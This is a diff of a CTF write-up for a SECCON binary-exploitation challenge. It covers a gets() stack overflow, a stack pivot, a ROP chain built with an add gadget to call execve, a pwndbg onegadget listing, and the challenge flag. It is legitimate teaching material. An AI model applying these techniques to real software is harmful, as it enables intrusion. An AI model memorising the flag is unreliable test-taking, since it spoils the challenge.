@@ -1,12 +1,22 @@
 # Make rop great again
 
 No pie, NX bit set, no canary
+```c
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
 
 ### Bug:
 Stack buffer overflow in the main function using `gets()`.
 
 ### Exploit:
-We can't do classic ret2libc here cause no `pop rdi; ret` gadget. But we can control the first argument of gets call by jumping in the middle of main function.
+In this challenge we can't perform classic ret2libc attack here because there is no `pop rdi; ret` gadget in the binary. But we can control the first argument of gets call by jumping in the middle of main function.
 
 ```c
    0x00000000004011be <+17>:	lea    rax,[rbp-0x10]
@@ -59,7 +69,7 @@ pwndbg>
 45:0228│-2f8 0x404528 —▸ 0x4011cf (main+34) ◂— mov eax, 0
 ```
 
-Stack pivot again (`0x404800`) to preserve the libc address. Now we can use the add_addr32 gadget to build execve rop chain in bss.
+Stack pivot again (`0x404800`) to preserve the libc address. We can now use the `add_addr32` gadget to build execve rop chain in bss.
 ```c
 0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
 ```
@@ -99,6 +109,42 @@ pwndbg>
 2e:0170│-2d8 0x404470 —▸ 0x404830 ◂— 0
 2f:0178│-2d0 0x404478 —▸ 0x7eb0cc4eef34 (execve+4)                 ◂— mov eax, 0x3b; syscall
 ```
+
+PS: A friend said one gadget worked fine lol. It wasn't that bad to build rop either :P
+
+And today I learned pwndbg has onegadget implementation where it shows gadgets based on current context and it SAT checks the gadget. Thats a big W, now you don't have to peek memory manually for every gadget. Thanks to the pwndbg team <3
+
+```c
+pwndbg> onegadget
+Using libc: ./libc.so.6
+
+0x1111aa posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x48], 0, rsp+0x70, [rsp+0xf0])
++----------+---------------------------------------------------------------------------------------------+
+| Result   | Constraint                                                                                  |
++==========+=============================================================================================+
+| SAT      | [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv |
++----------+---------------------------------------------------------------------------------------------+
+| SAT      | [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp                    |
++----------+---------------------------------------------------------------------------------------------+
+| SAT      | [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0                                            |
++----------+---------------------------------------------------------------------------------------------+
+
+0x1111b2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x48], 0, rsp+0x70, r9)
++----------+---------------------------------------------------------------------------------------------+
+| Result   | Constraint                                                                                  |
++==========+=============================================================================================+
+| SAT      | [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv |
++----------+---------------------------------------------------------------------------------------------+
+| SAT      | [r9] == NULL || r9 == NULL || r9 is a valid envp                                            |
++----------+---------------------------------------------------------------------------------------------+
+| SAT      | [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0                                            |
++----------+---------------------------------------------------------------------------------------------+
+
+Found 2 SAT gadgets.
+Found 15 UNSAT gadgets.
+Found 0 UNKNOWN gadgets.
+```
+
 
 Flag: `SECCON{53771n6_rd1_w17h_6375_m4k35_r0p_6r347_4641n}`
 
